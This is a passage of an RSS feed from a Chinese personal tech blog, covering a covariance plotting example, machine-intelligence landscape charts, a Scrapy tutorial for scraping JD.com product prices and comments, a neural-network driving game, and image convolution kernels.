import matplotlib.pyplot as plt

x, y = np.random.multivariate_normal([0, 0], [[5, 0.1], [0.1, 5]], 1000).T
plt.plot(x, y, &#39;x&#39;)
plt.axis(&#39;equal&#39;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/covariance/correlated_none_sparse.png&#34; alt=&#34;分散不相关&#34;&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看出来每个点都比较分散而且点与点之间没有明显的关系，并且$ \eta = Corr(X, Y) = {Cov(X, Y) \over \sqrt {Var(X) \cdot Var(Y)} } = { 0.1 \over \sqrt {5*5}} = 0.02 \approx 0 $ 也说明了这一点。&lt;/p&gt;
&lt;p&gt;指标x的方差$ Cov(x,x) = 5 $和y的方差 $ Cov(y,y) = 5 $说明数据分散性比前面的例子大了，数据点分散的坐标范围比前面的大了。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%9B&#34;&gt;https://baike.baidu.com/item/数学期望&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E6%96%B9%E5%B7%AE&#34;&gt;https://baike.baidu.com/item/方差&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.sina.com.cn/s/blog_672c5a470100miqq.html&#34;&gt;http://blog.sina.com.cn/s/blog_672c5a470100miqq.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E5%8D%8F%E6%96%B9%E5%B7%AE&#34;&gt;https://zh.wikipedia.org/wiki/协方差&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The Current State of Machine Intelligence (from Shivon Zilis)</title>
      <link>/2017/09/the-current-state-of-machine-intelligence-from-shivon-zilis/</link>
      <pubDate>Fri, 01 Sep 2017 14:29:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/09/the-current-state-of-machine-intelligence-from-shivon-zilis/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;看到几张描绘近几年来机器学习领域的行业版图：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.oreilly.com/ideas/the-current-state-of-machine-intelligence-3-0&#34;&gt;&amp;ldquo;The Current State of Machine Intelligence 3.0&amp;rdquo;&lt;/a&gt; published in 2016 by &lt;a href=&#34;http://www.shivonzilis.com&#34;&gt;Shivon Zilis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://format-com-cld-res.cloudinary.com/image/private/s--c_G81ApD--/c_crop,h_2250,w_3000,x_0,y_0/c_fill,g_center,h_855,w_1140/a_auto,fl_keep_iptc.progressive,q_95/Machine_Intelligence_Landscape_2015-05-28_2_zh0pbb.png&#34; alt=&#34;The Current State of Machine Intelligence 3.0&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.oreilly.com/ideas/the-current-state-of-machine-intelligence-2-0&#34;&gt;&amp;ldquo;The current state of machine intelligence 2.0&amp;rdquo;&lt;/a&gt; published in 2015 by &lt;a href=&#34;http://www.shivonzilis.com&#34;&gt;Shivon Zilis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://format-com-cld-res.cloudinary.com/image/private/s--XrGmu9XK--/c_crop,h_2250,w_3000,x_0,y_0/c_fill,g_center,h_855,w_1140/a_auto,fl_keep_iptc.progressive,q_95/v1/d8404d830b489d7a87eaefc35063a8a7/MI-Landscape-2_0-R10.jpg&#34; alt=&#34;The current state of machine intelligence 2.0&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;The Current State of Machine Intelligence&amp;rdquo; published in 2014 by &lt;a href=&#34;http://www.shivonzilis.com&#34;&gt;Shivon Zilis&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://format-com-cld-res.cloudinary.com/image/private/s--LpKDjJvM--/c_crop,h_1500,w_2000,x_0,y_0/c_fill,g_center,h_855,w_1140/a_auto,fl_keep_iptc.progressive,q_95/v1/19575bcc040a6dcff3097618ec9c585e/MI-Landscape-3_7.png&#34; alt=&#34;The Current State of Machine Intelligence&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>用scrapy爬取京东商品信息</title>
      <link>/2017/08/%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E4%BA%AC%E4%B8%9C%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF/</link>
      <pubDate>Thu, 31 Aug 2017 09:46:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/08/%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E4%BA%AC%E4%B8%9C%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;scrapy是一个非常著名的爬虫框架，使用这个框架可以非常容易的生成一个网站爬虫程序框架，之后就可以在框架之上方便的进行爬虫的编写。&lt;/p&gt;
&lt;p&gt;进来想要了解一些产品的市场信息，就用scrapy写了个简单的爬虫，写个笔记记录一下。&lt;/p&gt;
&lt;h1 id=&#34;安装&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85&#34;&gt;
        ##
    &lt;/a&gt;
    安装
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;使用python环境的话最好通过pip进行安装，这样操作简单方便，直接使用下面的命令即可：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ pip install scrapy
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;scrapy框架提供了&amp;rsquo;scrapy&amp;rsquo;命令进行项目的创建及运行管理，所以首先看一下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ scrapy --help
Scrapy 1.4.0 - no active project

Usage:
  scrapy &amp;lt;command&amp;gt; [options] [args]

Available commands:
  bench         Run quick benchmark test
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy

  [ more ]      More commands available when run from project directory

Use &amp;quot;scrapy &amp;lt;command&amp;gt; -h&amp;quot; to see more info about a command
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;创建项目&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e9%a1%b9%e7%9b%ae&#34;&gt;
        ##
    &lt;/a&gt;
    创建项目
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;首先使用&amp;rsquo;scrapy startproject&amp;rsquo;创建项目&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ scrapy startproject crawler
New Scrapy project &#39;crawler&#39;, using template directory &#39;/Users/wangq/virtualenv/test/lib/python2.7/site-packages/scrapy/templates/project&#39;, created in:
    /Users/wangq/tmp/crawler

You can start your first spider with:
    cd crawler
    scrapy genspider example example.com
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&amp;rsquo;scrapy genspider&amp;rsquo;创建爬虫&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cd crawler
$ scrapy genspider jd list.jd.com
$ ls crawler/spiders/jd.py
crawler/spiders/jd.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;到此爬虫的框架就创建好了，爬虫的主要代码需要在jd.py中完成。&lt;/p&gt;
&lt;h1 id=&#34;编写爬虫&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e5%86%99%e7%88%ac%e8%99%ab&#34;&gt;
        ##
    &lt;/a&gt;
    编写爬虫
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;爬虫代码框架&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%88%ac%e8%99%ab%e4%bb%a3%e7%a0%81%e6%a1%86%e6%9e%b6&#34;&gt;
        #
    &lt;/a&gt;
    爬虫代码框架
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;爬虫的代码主要是在crawler/spiders/jd.py中，打开这个文件看到内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# -*- coding: utf-8 -*-
import scrapy


class JdSpider(scrapy.Spider):
    name = &#39;jd&#39;
    allowed_domains = [&#39;list.jd.com&#39;]
    start_urls = [&#39;http://list.jd.com/&#39;]

    def parse(self, response):
        pass
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;简单解释下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;name: 爬虫的名字&lt;/li&gt;
&lt;li&gt;allowed_domains: 当时用了OffsiteMiddleware的时候这个配置可以限定爬虫爬取的站点的域名列表&lt;/li&gt;
&lt;li&gt;start_urls: 指定爬虫开始运行时的爬取URL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在生成的代码中有一个parse()方法，每当爬虫获取一个新的页面爬去返回数据的时候就把这个数据通过response传递给parse()方法进行内容处理。&lt;/p&gt;
&lt;h2 id=&#34;了解要爬取网页的结构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%ba%86%e8%a7%a3%e8%a6%81%e7%88%ac%e5%8f%96%e7%bd%91%e9%a1%b5%e7%9a%84%e7%bb%93%e6%9e%84&#34;&gt;
        #
    &lt;/a&gt;
    了解要爬取网页的结构
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;编写爬虫前先了解被爬取网页的结构信息，以及信息提取方法。这次我需要提取的信息主要是商品列表页面中的物品、价格、评论数这些基本信息，使用浏览器开发者功能查看对应的元素。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/08/scrapy/scrapy-001.png?x-oss-process=style/png2jpg&#34; alt=&#34;page structure&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析页面发现需要的条目的class都有&amp;rsquo;j-sku-item&amp;rsquo;属性值，知道这个规律后页就可以使用xpath获取到这个条目的具体内容了。&lt;/p&gt;
&lt;h2 id=&#34;通过xpath获取选取的页面元素&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%80%9a%e8%bf%87xpath%e8%8e%b7%e5%8f%96%e9%80%89%e5%8f%96%e7%9a%84%e9%a1%b5%e9%9d%a2%e5%85%83%e7%b4%a0&#34;&gt;
        #
    &lt;/a&gt;
    通过xpath获取选取的页面元素
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;每个div的class属性包含&amp;rsquo;j-sku-item&amp;rsquo;的元素可以通过xpath的这条规则来描述&amp;quot;//div[contains(@class, &amp;lsquo;j-sku-item&amp;rsquo;)]&amp;quot;，scrapy的response可以直接支持xpath，那么想要获取这个对应的元素就可以通过这行代码来获取了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;response.xpath(&amp;quot;//div[contains(@class, &#39;j-sku-item&#39;)]&amp;quot;):
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;获取价格及评论信息&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%8e%b7%e5%8f%96%e4%bb%b7%e6%a0%bc%e5%8f%8a%e8%af%84%e8%ae%ba%e4%bf%a1%e6%81%af&#34;&gt;
        #
    &lt;/a&gt;
    获取价格及评论信息
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;通常的静态内容网站数据都可以使用xpath来获取，但在爬京东的网站过程中发现价格及评论数据不是后端与页面一起处理好之后一起发送过来的，所以这两个信息无法使用xpath获取，但仔细分析网络请求可以发现这些信息是通过两个web调用来获取的，我们可以使用python的requests库来获取。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取评论信息的调用：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/08/scrapy/scrapy-002.jpeg?x-oss-process=style/png2jpg&#34; alt=&#34;comments信息&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来可以使用curl来尝试获取评论信息的方法，最终发现访问可以通过类似的简化来完成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://club.jd.com/comment/productCommentSummaries.action?my=pinglun&amp;amp;referenceIds=959228,1722097,1722101
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;主要参数是referenceIds，这里可以指定需要获取的sku的列表。获取的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def get_comments(sku_id_list):
    &amp;quot;&amp;quot;&amp;quot;
    url: https://club.jd.com/comment/productCommentSummaries.action?my=pinglun&amp;amp;referenceIds=959228,1722097,1722101&amp;quot;
    &amp;quot;&amp;quot;&amp;quot;
    ids = &#39;,&#39;.join(sku_id_list)
    url = &amp;quot;https://club.jd.com/comment/productCommentSummaries.action?my=pinglun&amp;amp;referenceIds=&amp;quot; + ids
    rsp = requests.get(url)
    return rsp.json()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;获取价格信息的调用：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/08/scrapy/scrapy-003.jpeg?x-oss-process=style/png2jpg&#34; alt=&#34;price信息&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;与获取评论信息类似，最终发现调用的接口可以简化成这个样子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://p.3.cn/prices/mgets?skuIds=J_959228%2CJ_1722101%2CJ_2064343
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不同之处是每个sku前面加了一个&amp;quot;J_&amp;ldquo;字段。参照获取评论的方法代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def get_prices(sku_id_list):
    &amp;quot;&amp;quot;&amp;quot;
    url: https://p.3.cn/prices/mgets?skuIds=J_959228%2CJ_1722101%2CJ_2064343
    &amp;quot;&amp;quot;&amp;quot;
    str_id_list = map(lambda x: &amp;quot;J_&amp;quot;+x, sku_id_list)
    ids = &#39;,&#39;.join(str_id_list)
    url = &amp;quot;https://p.3.cn/prices/mgets?skuIds=&amp;quot; + ids
    rsp = requests.get(url)
    return rsp.json()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;分页处理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%88%86%e9%a1%b5%e5%a4%84%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    分页处理
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;京东的商品条目很多的时候会分页展示，需要爬虫识别分页信息并自动抓取进行上面的处理。&lt;/p&gt;
&lt;p&gt;首先先找到如何导向下一页的连接：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/08/scrapy/scrapy-004.png?x-oss-process=style/png2jpg&#34; alt=&#34;分页链接&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取链接的方式可以通过xpath抓取，把抓取的连接传给scrapy的Request()方法进行新页面的抓取，并指定抓取信息的处理回调即可。代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;next_page = response.xpath(&amp;quot;//a[@class=&#39;pn-next&#39;]/@href&amp;quot;).get()
if next_page:
    yield scrapy.Request(&amp;quot;https://list.jd.com&amp;quot;+next_page, callback=self.parse)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;抓取项目进行pipeline处理&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%8a%93%e5%8f%96%e9%a1%b9%e7%9b%ae%e8%bf%9b%e8%a1%8cpipeline%e5%a4%84%e7%90%86&#34;&gt;
        #
    &lt;/a&gt;
    抓取项目进行pipeline处理
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;每一条被爬取好的信息条目会发给pipeline模块进行处理，因此pipeline可以对数据做很多后期的处理工作，包括但不限于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;清洗抓起数据&lt;/li&gt;
&lt;li&gt;验证抓取的数据&lt;/li&gt;
&lt;li&gt;去重&lt;/li&gt;
&lt;li&gt;存储数据&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这次实践主要用pipeline进行数据的存储处理。默认情况下scrapy使用自带的pipeline进行处理，如果需要进行特殊处理则需要对pipeline进行配置。配置文件是crawler/settings.py。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Configure item pipelines
# See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html
ITEM_PIPELINES = {
    &#39;crawler.pipelines.CrawlerPipeline&#39;: 300,
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;pipeline的配置通过ITEM_PIPELINES完成，可以指定多个pipeline，这样一个pipeline处理完之后可以交给后面的pipeline处理。每一个pipeline条目有一个0-1000之间的整数参数，这个参数指定了pipeline的执行顺序。&lt;/p&gt;
&lt;p&gt;配置好pipeline之后可以在crawler/pipelines.py中编写代码进行存储处理。默认生成的代码中只包含process_item()方法，但对于需要打开文件或者数据库的场景处理会不太方便，我们可以增加open_spider()和close_spider()方法进行处理，比如&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class CrawlerPipeline(object):
    def open_spider(self, spider):
        self.file = open(&#39;result.json&#39;, &#39;w&#39;)

    def close_spider(self, spider):
        self.file.close()

    def process_item(self, item, spider):
        line = json.dumps(dict(item)).decode(&amp;quot;unicode_escape&amp;quot;).encode(&#39;utf-8&#39;) + &#39;\n&#39;
        self.file.write(line)
        return item
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;编码问题&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e7%a0%81%e9%97%ae%e9%a2%98&#34;&gt;
        #
    &lt;/a&gt;
    编码问题
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;前面的process_item()方法中有一行处理编码的代码需要解释一下。在用下面这行代码不进行编码处理的情况下如果直接存储json.dumps()的结果时会存储成人类不能直接阅读的内容。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;line = json.dumps(dict(item)) + &#39;\n&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如下存储的其中一个条目，会发现&amp;quot;name&amp;quot;变成了&amp;rdquo;\uXXXX\uXXXX&amp;quot;的字符串。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;sku&amp;quot;: &amp;quot;10391738071&amp;quot;, &amp;quot;category&amp;quot;: &amp;quot;3128&amp;quot;, &amp;quot;vendor&amp;quot;: &amp;quot;138857&amp;quot;, &amp;quot;name&amp;quot;: &amp;quot;\u98de\u5229\u6d66\uff08PHILIPS\uff09\u51c0\u6c34\u5668 WP4170/00\u7eaf\u6c34\u673a+WP4100/00\u524d\u7f6e\u8fc7\u6ee4\u5668\u5957\u88c5&amp;quot;, &amp;quot;price&amp;quot;: 4699.0,            &amp;quot;comments&amp;quot;: 4}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原因是因为json.dumps()对于中文字符的处理会进行escape处理，为了存储需要首先进行unescape，就是进行decode(&amp;ldquo;unicode_escape&amp;rdquo;)。处理后的结果变成了utf-8编码，需要注意的是这还不够。如果这行代码写成下面的形式，则会发现些文件的时候无法写入文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;line = json.dumps(dict(item)).decode(&amp;quot;unicode_escape&amp;quot;) + &#39;\n&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;产生的错误发生在file.write()中：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode characters in position 71-72: ordinal not in range(128)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是因为直接写入文件时write()会认为所有的数据都是ascii码，但中文情况下显然是不成立的。因此需要对数据进行encode()，参照下面的代码写就没有问题了：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;line = json.dumps(dict(item)).decode(&amp;quot;unicode_escape&amp;quot;).encode(&#39;utf-8&#39;) + &#39;\n&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注，有写地方会用sys.setdefaultencoding(&amp;lsquo;utf-8&amp;rsquo;)来进行处理，但是不是万不得已并不推荐这种直接改变全局环境的做法，有可能会让程序产生意料不到的情况。&lt;/p&gt;
&lt;h1 id=&#34;数据分析&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90&#34;&gt;
        ##
    &lt;/a&gt;
    数据分析
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;这次抓取数据主要是分析在各个价格区间的产品用户使用情况，因此可以通过柱状图来展示。横坐标表示价格，用100元为一个区间进行统计。纵坐标显示在这100元的价格范围内的用户评论数量。&lt;/p&gt;
&lt;p&gt;画图使用matplotlib编写，主要的代码逻辑如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PRICE_UNIT = 100

axis_price = range(PRICE_LOWER_RANGE, PRICE_UPPER_RANGE, PRICE_UNIT)
axis_comment = [0] * len(axis_price)

for item in get_all_sku(category=category):
    idx = int(item.price/PRICE_UNIT)
    
    # 当超过统计价格的上限区间后将结果合并到最高价格范围中
    if idx &amp;gt;= len(axis_price):
        axis_comment[-1] += item.comment
    else:
        axis_comment[idx] += item.comment

width=0.8*PRICE_UNIT
plt.bar(axis_price, axis_comment, width, color=&#39;blue&#39;, align=&#39;edge&#39;)
plt.show()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;绘制结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/08/scrapy/scrapy-005.png?x-oss-process=style/png2jpg&#34; alt=&#34;绘图&#34;&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>神经网络实践：自动驾驶</title>
      <link>/2017/08/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%B7%B5%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/</link>
      <pubDate>Thu, 17 Aug 2017 20:01:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/08/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%B7%B5%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;最近学习了下神经网络，于是写了一个开车的小游戏，然后训练了一个6层神经网络自己驾驶练练手。&lt;/p&gt;
&lt;p&gt;代码实现主要用了pygame和numpy，网络有7个输入分别对应小车前面的7个距离探头数据，2个输出进行转向输出。&lt;/p&gt;
&lt;embed&gt;
&lt;div class=&#34;td-player&#34;&gt;&lt;object type=&#34;application/x-shockwave-flash&#34; id=&#34;CustomPlayer&#34; data=&#34;http://static.youku.com/v20170420.0/v/custom/upsplayer/player.swf&#34; width=&#34;480&#34; height=&#34;400&#34;&gt;&lt;param name=&#34;menu&#34; value=&#34;false&#34;&gt;&lt;param name=&#34;scale&#34; value=&#34;noScale&#34;&gt;&lt;param name=&#34;allowFullscreen&#34; value=&#34;true&#34;&gt;&lt;param name=&#34;allowFullScreenInteractive&#34; value=&#34;true&#34;&gt;&lt;param name=&#34;allownetworking&#34; value=&#34;all&#34;&gt;&lt;param name=&#34;allowScriptAccess&#34; value=&#34;always&#34;&gt;&lt;param name=&#34;bgcolor&#34; value=&#34;#000000&#34;&gt;&lt;param name=&#34;wmode&#34; value=&#34;transparent&#34;&gt;&lt;param name=&#34;flashvars&#34; value=&#34;playerId=tdnws&amp;amp;autoPlay=true&amp;amp;skin=http://static.youku.com/v20170420.0/v/custom/upsplayer/skin/tdnws.swf&amp;amp;lang=td&amp;amp;vcode=XMjk3NjU0MTcwNA==&amp;amp;cna=JUIjEjtGCjoCAWVQ1%2BAkCtoY&amp;amp;ytid=-1&amp;amp;winType=interior&amp;amp;adext=&#34;&gt;&lt;/object&gt;&lt;div class=&#34;td-player__html5&#34; id=&#34;player_noflash&#34;&gt;&lt;div class=&#34;td-player__html5__skin&#34;&gt;&lt;div class=&#34;td-player__html5__con&#34;&gt;&lt;span class=&#34;td-player__html5__txt&#34;&gt;您还没有安装flash播放器,请点击 &lt;a href=&#34;//www.adobe.com/go/getflash&#34; target=&#34;_blank&#34;&gt;这里&lt;/a&gt; 安装&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/embed&gt;
</description>
    </item>
    
    <item>
      <title>图像卷积实践</title>
      <link>/2017/07/%E5%9B%BE%E5%83%8F%E5%8D%B7%E7%A7%AF%E5%AE%9E%E8%B7%B5/</link>
      <pubDate>Sun, 30 Jul 2017 18:30:50 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/07/%E5%9B%BE%E5%83%8F%E5%8D%B7%E7%A7%AF%E5%AE%9E%E8%B7%B5/</guid>
      <description>&lt;p&gt;最近对图像识别技术很感兴趣，了解到在这个领域中CNN的应用可以比较有效的解决问题，这里对卷积（convolution）相关的知识进行一下记录说明。&lt;/p&gt;
&lt;h1 id=&#34;图像卷积是什么&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9b%be%e5%83%8f%e5%8d%b7%e7%a7%af%e6%98%af%e4%bb%80%e4%b9%88&#34;&gt;
        ##
    &lt;/a&gt;
    图像卷积是什么？
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;将一张图片看作一张像素的矩阵的话，卷积就是把另一个矩阵（卷积核）在这张图片上移动，在移动的过程中取图片上对应大小的矩阵与卷积核进行运算，每次矩阵运算得出的结果保存成一个新的像素，这个过程就是图像的卷积运算。&lt;/p&gt;
&lt;p&gt;卷积的过程可以用下面的示意图展示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://ujwlkarn.files.wordpress.com/2016/07/convolution_schematic.gif?w=536&amp;amp;h=392&#34; alt=&#34;图像卷积过程&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/convolution-001.png&#34; alt=&#34;卷积计算&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;为什么做卷积&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%b8%ba%e4%bb%80%e4%b9%88%e5%81%9a%e5%8d%b7%e7%a7%af&#34;&gt;
        ##
    &lt;/a&gt;
    为什么做卷积？
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;一张原始图像包含了大量的噪音信息，这些噪音信息会干扰后续的运算过程。如果将一张图像看作一个输入信号的话，如果找到一种过滤器将噪音信息过滤掉就可以提高后续运算的准确度。卷积就是这么一个过滤器，这个过滤器的正式称呼是卷积核。&lt;/p&gt;
&lt;p&gt;那么这个过滤器可以做些什么呢？其实常见的图像处理软件早已经在使用卷积进行图片处理了，比如图像锐化、模糊、浮雕效果等等&amp;hellip;&lt;/p&gt;
&lt;p&gt;下面收集了一些常用的过滤器，对这张图片处理后可以看一下效果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/mini.png?x-oss-process=style/png2jpg&#34; alt=&#34;原图&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;图像边界检测&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left[
\begin{matrix}
-1 &amp; -1 &amp; -1 \\
-1 &amp; 8 &amp; -1 \\
-1 &amp; -1 &amp; -1
\end{matrix}
\right]
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/edge.png?x-oss-process=style/png2jpg&#34; alt=&#34;边界检测&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;图像模糊&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left[
\begin{matrix}
0 &amp; 1 &amp; 0 \\
1 &amp; 1 &amp; 1 \\
0 &amp; 1 &amp; 0
\end{matrix}
\right]
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/blur.png?x-oss-process=style/png2jpg&#34; alt=&#34;模糊&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;图像锐化&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left[
\begin{matrix}
-1 &amp; -1 &amp; -1 \\
-1 &amp; 9 &amp; -1 \\
-1 &amp; -1 &amp; -1
\end{matrix}
\right]
$$
&lt;/div&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/07/sharpen.png?x-oss-process=style/png2jpg&#34; alt=&#34;锐化&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;浮雕&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
$$
\left[
\begin{matrix}
